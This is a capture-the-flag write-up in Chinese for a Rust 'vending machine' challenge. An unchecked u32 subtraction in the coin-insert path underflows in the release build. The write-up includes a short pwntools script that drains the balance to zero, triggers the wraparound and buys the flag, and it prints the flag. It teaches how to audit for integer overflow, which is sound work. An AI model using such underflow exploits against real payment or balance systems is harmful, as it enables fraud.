# Rusty Vending Machine

## 题目简述

程序用 `u32` 保存余额，初始值为 100。购买商品时会先调用 `check_balance` 检查余额，但“投币”分支只执行 `balance = balance - 1`，没有确认余额是否大于 0。二进制按 Rust release 模式编译，整数溢出检查默认关闭，因此从 0 减 1 会回绕到 $2^{32}-1$。

## 解题过程

先用现有余额恰好消费到 0：

$$
6\times13+2\times11=78+22=100
$$

也就是购买 6 次盆栽和 2 次披萨。此时再选择“Insert Coin”，未检查的减法发生下溢：

$$
0-1\equiv2^{32}-1=4294967295\pmod{2^{32}}
$$

余额于是远大于 flag 的价格 1,000,000，正常的 `balance >= amount` 检查反而会通过。交互步骤可写成：

```python
from pwn import *

io = process("./chall")

for _ in range(6):
    io.sendlineafter(b"Leave\n", b"2")
    io.sendlineafter(b"go back", b"1")

for _ in range(2):
    io.sendlineafter(b"Leave\n", b"2")
    io.sendlineafter(b"go back", b"2")

io.sendlineafter(b"Leave\n", b"1")  # 0 -> u32::MAX
io.sendlineafter(b"Leave\n", b"2")
io.sendlineafter(b"go back", b"3")
io.interactive()
```

程序输出：

```text
grey{bUt_h3y_a_f1aG_1s_4_Fl4g!}
```

## 方法总结

- 核心技巧：先把无符号余额精确清零，再触发 release 构建中的减法下溢回绕。
- 识别信号：余额使用无符号整数，某些扣款路径有充足性检查，而另一路径直接执行减法；题目还特别说明 release 编译方式。
- 复用要点：应审计每一条状态修改路径，而不是只看公共检查函数；Rust 的内存安全不等于业务算术安全，release 与 debug 的溢出行为也可能不同。
